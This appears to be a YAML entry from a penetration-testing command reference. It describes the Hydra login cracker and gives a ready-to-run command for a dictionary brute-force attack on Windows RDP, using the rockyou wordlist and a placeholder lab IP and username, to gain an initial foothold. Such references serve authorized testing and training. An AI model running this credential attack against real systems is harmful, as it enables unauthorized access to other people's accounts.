---
description: |
  Hydra is a fast, parallelized network login cracker that supports numerous protocols. The following command performs an online brute-force/dictionary attack against a Windows RDP service using a known username and a password wordlist, useful for gaining an initial foothold when RDP is exposed and account lockout policies are not in place.

  Command Reference:

  	Target IP: 10.10.10.1

  	Username: john

  	Wordlist: /usr/share/wordlists/rockyou.txt

command: |
  hydra -l john -P /usr/share/wordlists/rockyou.txt rdp://10.10.10.1
items:
  - Username
services:
  - RDP
OS:
  - Windows
phases:
  - CredentialAccess
references:
  - https://github.com/vanhauser-thc/thc-hydra
  - https://www.kali.org/tools/hydra/
---
